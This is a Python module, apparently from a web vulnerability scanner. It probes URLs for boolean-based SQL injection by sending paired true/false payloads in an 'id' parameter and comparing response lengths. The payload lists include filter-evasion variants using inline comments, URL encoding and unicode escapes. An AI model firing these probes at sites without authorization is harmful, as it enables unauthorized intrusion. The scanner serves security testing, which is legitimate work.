# -*- coding: utf-8 -*-
import requests
import re
from Repair import repair
from WebScan import *
from WebScan import output


#存储Payload (可扩展)
class Payload_store:

    payload_base1 = ["1","1 and 1=1", "1 and 1=2"]
    payload_base2 = ["1","1' and '1'='1", "1' and '1'='2"]
    payload_base3 = ["1", "1' /*!and*/ '1'='1", "1' /*!and*/ '1'='2"]
    payload_base4 = ["1", "1' AND '1'='1", "1' AND '1'='2"]
    payload_base5 = ["1", "1' /*//*/and/*//*/ '1'='1", "1' /*//*/and/*//*/ '1'='2"]
    payload_base6 = ["1", "1' %61%6e%64 '1'='1", "1' %61%6e%64 '1'='2"]
    payload_base7 = ["1", "1' \u0061\u006e\u0064 '1'='1", "1' \u0061\u006e\u0064 '1'='2"]

    payload = [payload_base1,
               payload_base2,
               payload_base3,
               payload_base4,
               payload_base5,
               payload_base7,
               ]
#PS 如需增加其他功能的payload 需要在repair.py中也增加对应的修改建议

# Define SQL FUNCTION
class SQL:

    def __init__(self,islog=True,session=requests.session):
        self.list = []
        self.islog=islog
        self.session=session

    # 对payload进行编码
    def EncodePayload(self,payload):
        return requests.utils.quote(payload)

    # 正则匹配URL的格式
    def URL_CHECK(self,url):
        #Fix_url=re.search('(http[s]?://.*?\.php)',url) #正则匹配url格式为.php结尾
        Fix_url2=re.search('(http[s]?://.*?/$)',url) #正则匹配url格式为/结尾
        Fix_url=False
        if Fix_url:
            return Fix_url.group(1) + "?"
        if Fix_url2:
            return Fix_url2.group(1) + "index.php?"
        else:
            return False #匹配失败返回False

    #GET的封装
    def GET(self,URL,payload):
        data ={'id':payload,"Submit":"Submit"}
        g=self.session.get(URL,params=data)
        #print g.url #检查注入的URL
        #print g.headers
        try:
            length=g.headers['Content-Length']
            #print length
        except:
            Exception
            length=0
        return length

        #return r.content

    ###CORE FUNCTION###
    def SQL_CHECK(self,echo, echo1, echo2): #通过页面回显判断是否存在SQL注入
        if echo1>echo2:
            return True
        else:
            return False

    def SQL_INSERT(self,url, payload):# 返回一个dict类型

        URL = self.URL_CHECK(url) #匹配+优化URL
        if URL==False:
            output.printf("\t\tDROP ONE UseLess URL...",'blue')
            return {'url':'0'} #返回一个dict类型

        output.printf("[*]URL=" + url,'green')
        # 遍历所有的Payload和URL的组合
        for i in range(len(payload)):
            #print "len of payload="+str(len(payload))
            URL = self.URL_CHECK(url)
            URL1 = self.URL_CHECK(url)
            URL2 = self.URL_CHECK(url)
            #print URL2
            echo = self.GET(URL,payload[i][0])
            echo1 = self.GET(URL1,payload[i][1])
            echo2 = self.GET(URL2,payload[i][2])

            #print "Echo1="+str(echo1)
            #print "Echo2=" +str(echo2)

            #打印payload
            #output.printf("\tPayload=>" + "[" + payload[i][0] + "," + payload[i][1] + "," + payload[i][2] + "]","yellow")
            lists=[]
            if self.SQL_CHECK(echo, echo1, echo2): #判断是否存在注入
                output.printf("\t\tFound SQL injection point"+"=>"+url,'red')

                if  self.islog: #记录日志
                    log.write("SQL","Found SQL injection point"+"=>"+url)
                l={}
                l["url"]=url
                l["id"]=i
                lists.append(l)
                #print "l->url"+str(l["url"])
                return l
            else:
                pass
                #output.printf ("\t\tno SQL INSERT found",'white')
        return {'url':'0'}
    def POC(self):
        pass